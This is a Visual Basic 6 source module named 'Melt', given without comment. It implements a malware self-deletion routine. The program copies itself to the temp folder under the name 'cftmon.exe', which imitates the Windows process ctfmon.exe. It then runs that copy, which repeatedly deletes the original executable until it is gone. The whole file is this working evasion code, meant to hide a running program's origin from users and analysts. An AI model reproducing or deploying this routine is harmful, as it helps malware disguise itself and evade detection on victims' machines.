Attribute VB_Name = "Melt"
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

Function MeltX()

    MyName = App.EXEName
    
    If LCase(App.EXEName) = "cftmon" Then
        Call Execute
    Else
        Call MeltFile
    End If
End Function

Function Execute()
    
    On Error Resume Next

    If Not IsEmpty(Command$) Then
        While Dir(Command$) <> ""
            Kill Command$
            DoEvents
        Wend
    End If
End Function

Function MeltFile()
    
    Dim MySelf As String
    MySelf = String$(255, Chr$(0))

    GetModuleFileName 0, MySelf, Len(MySelf)

    FileCopy MySelf, Environ("TMP") & "\cftmon.exe"
    DoEvents
    Shell Environ("tmp") & "\cftmon.exe " & MySelf
    End
End Function
